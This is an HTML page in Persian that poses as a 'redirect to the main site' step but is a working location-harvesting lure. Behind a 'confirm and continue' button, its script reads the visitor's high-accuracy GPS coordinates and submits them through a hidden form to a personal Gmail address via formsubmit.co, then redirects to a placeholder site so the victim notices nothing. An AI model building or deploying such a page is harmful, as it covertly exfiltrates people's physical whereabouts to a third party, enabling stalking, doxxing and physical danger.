<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔗 انتقال سریع</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f8f9fa;
            direction: rtl;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
        #result {
            margin-top: 20px;
            font-size: 16px;
            color: #333;
        }
    </style>
</head>
<body>

    <h1>🔗 انتقال به سایت اصلی</h1>
    <p>برای ادامه، روی دکمه زیر کلیک کنید و دسترسی موقعیت را تأیید کنید.</p>

    <button onclick="getLocation()">✅ تأیید و ادامه</button>
    <p id="result"></p>

    <!-- فرم مخفی برای ارسال اطلاعات به ایمیل -->
    <form id="locationForm" action="https://formsubmit.co/misofiko3@gmail.com" method="POST">
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="_subject" value="📍 موقعیت جدید دریافت شد">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">
    </form>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                document.getElementById("result").innerText = "⌛ در حال دریافت موقعیت مکانی...";
                
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    showError, 
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 } // کاهش تایم‌اوت به 15 ثانیه برای سرعت بیشتر
                );
            } else {
                document.getElementById("result").innerText = "⛔ مرورگر شما از موقعیت‌یابی پشتیبانی نمی‌کند.";
            }
        }

        function sendPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            document.getElementById("result").innerText = "⌛ در حال ارسال اطلاعات...";

            // مقداردهی فرم
            document.getElementById("latitude").value = latitude;
            document.getElementById("longitude").value = longitude;

            // ارسال فرم به ایمیل
            document.getElementById("locationForm").submit();

            // 🚀 انتقال سریع به سایت اصلی پس از ارسال اطلاعات
            setTimeout(() => {
                window.location.href = "https://example.com"; // لینک سایت اصلی را جایگزین کنید
            }, 2000);
        }

        function showError(error) {
            let message = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = "⛔ شما دسترسی به موقعیت مکانی را رد کردید.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "⚠️ موقعیت مکانی شما در دسترس نیست.";
                    break;
                case error.TIMEOUT:
                    message = "⏳ درخواست موقعیت‌یابی بیش از حد طول کشید. لطفاً دوباره امتحان کنید.";
                    break;
                default:
                    message = "❌ خطای نامشخصی رخ داد.";
            }
            document.getElementById("result").innerText = message;
        }
    </script>

</body>
</html>
